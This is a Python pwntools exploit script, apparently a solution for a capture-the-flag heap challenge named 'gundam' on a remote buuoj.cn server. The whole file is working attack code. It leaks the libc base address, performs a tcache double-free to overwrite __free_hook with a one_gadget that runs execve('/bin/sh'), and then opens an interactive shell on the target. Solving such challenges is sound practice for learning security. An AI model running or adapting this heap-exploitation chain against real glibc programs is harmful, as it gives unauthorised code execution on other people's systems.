from pwn import *


#context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
#context.terminal = ['tmux', 'splitw', '-h']

libc = ELF('./libc.so.6')

debug = 0

one_gadget = 0x4f322 
'''
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''

if debug:
	io = process('./gundam')
else:
    io = remote('node4.buuoj.cn',28310)
        
def p():
    gdb.attach(proc.pidof(io)[0])

def build(name):
    io.sendlineafter(b"Your choice : ",b'1') 
    io.sendlineafter(b"name of gundam :",name)
    io.sendlineafter(b"the gundam :",b'2')

def visit():
    io.sendlineafter(b"Your choice : ",b'2') 

def destory(idx):
    io.sendlineafter(b"Your choice : ",b'3') 
    io.sendlineafter(b"to Destory:",idx)

def blow():
    io.sendlineafter(b"Your choice : ",b'4') 

# 先泄漏libc

for i in range(9):
	build(b'aaaaaaa')

for i in range(9):
    destory(str(i))
# p()
blow()

for i in range(9):
	build(b'aaaaaaa')

visit()

libc_base = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) -  0x3ebca0
success("libc_base --->"+hex(libc_base))

# tcache dup
destory(str(0))
destory(str(0))
blow()

free_hook = libc_base + libc.symbols['__free_hook']
success("__free_hook -->"+hex(free_hook))
build(p64(free_hook))
visit()# 已经申请满了，所以要先free，再申请
for i in range(8):
    destory(str(i+1))
visit()
blow()
#p()

for i in range(7):
    build(b'a'*7)
    
visit()
one_gadget += libc_base
build(p64(one_gadget))
destory(str(3))

io.interactive()
